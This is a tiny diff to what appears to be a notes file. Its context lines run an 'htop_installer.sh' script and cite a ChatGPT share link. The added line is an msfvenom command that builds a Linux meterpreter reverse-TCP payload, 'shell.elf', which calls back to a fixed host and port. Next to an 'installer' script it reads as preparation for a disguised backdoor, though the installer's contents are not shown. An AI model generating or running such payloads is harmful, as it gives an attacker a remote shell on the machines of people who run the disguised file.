@@ -4,3 +4,4 @@ chmod +x htop_installer.sh
   ./htop_installer.sh
 
 https://chatgpt.com/share/6863d236-dbf4-8005-924f-1a9d77b2e78a
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.223.129 LPORT=4444 -f elf > shell.elf
